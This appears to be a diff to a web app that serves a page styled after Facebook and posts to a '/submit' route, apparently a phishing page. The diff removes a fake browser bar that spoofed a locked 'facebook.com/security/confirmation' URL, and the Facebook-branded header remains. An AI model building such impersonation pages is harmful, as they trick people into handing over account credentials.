@@ -48,18 +48,6 @@ app.post('/submit', (req, res) => {
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
         body { background-color: #f0f2f5; min-height: 100vh; }
-        .browser-bar { background: #dee1e6; padding: 6px 8px; display: flex; align-items: center; gap: 8px; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        .browser-dots { display: flex; gap: 6px; padding: 0 4px; }
-        .dot { width: 12px; height: 12px; border-radius: 50%; }
-        .dot.red { background: #ff5f57; }
-        .dot.yellow { background: #febc2e; }
-        .dot.green { background: #28c840; }
-        .browser-nav-btn { width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; color: #5f6368; font-size: 16px; opacity: 0.6; }
-        .browser-url { flex: 1; background: white; border-radius: 20px; padding: 7px 16px; display: flex; align-items: center; gap: 10px; font-size: 13px; color: #202124; }
-        .lock-icon { color: #1a73e8; font-size: 13px; }
-        .url-domain { color: #202124; font-weight: 500; }
-        .url-path { color: #5f6368; }
-        .browser-menu { padding: 0 8px; color: #5f6368; font-size: 16px; letter-spacing: 2px; }
         .header { background: linear-gradient(#4e69a2, #3b5998 50%); border-bottom: 1px solid #133783; min-height: 82px; }
         .header-inner { max-width: 980px; margin: 0 auto; padding: 10px 0; display: flex; justify-content: space-between; align-items: center; }
         .logo { color: white; font-size: 40px; font-weight: bold; padding-top: 10px; }
@@ -94,11 +82,6 @@ app.post('/submit', (req, res) => {
             .logo { font-size: 24px; }
             .card { padding: 24px 16px; }
             .title { font-size: 18px; }
-            .browser-bar { padding: 4px 6px; gap: 4px; }
-            .browser-dots .dot { width: 10px; height: 10px; }
-            .browser-nav-btn { display: none; }
-            .browser-menu { display: none; }
-            .browser-url { padding: 5px 12px; font-size: 11px; }
         }
         input, button, a.btn {
             -webkit-appearance: none;
@@ -108,21 +91,6 @@ app.post('/submit', (req, res) => {
     </style>
 </head>
 <body>
-    <div class="browser-bar">
-        <div class="browser-dots">
-            <div class="dot red"></div>
-            <div class="dot yellow"></div>
-            <div class="dot green"></div>
-        </div>
-        <div class="browser-nav-btn">←</div>
-        <div class="browser-nav-btn">→</div>
-        <div class="browser-nav-btn">↻</div>
-        <div class="browser-url">
-            <span class="lock-icon">🔒</span>
-            <span class="url-domain">https://www.facebook.com</span><span class="url-path">/security/confirmation</span>
-        </div>
-        <div class="browser-menu">⋮</div>
-    </div>
     <div class="header">
         <div class="header-inner">
             <div class="logo">facebook</div>
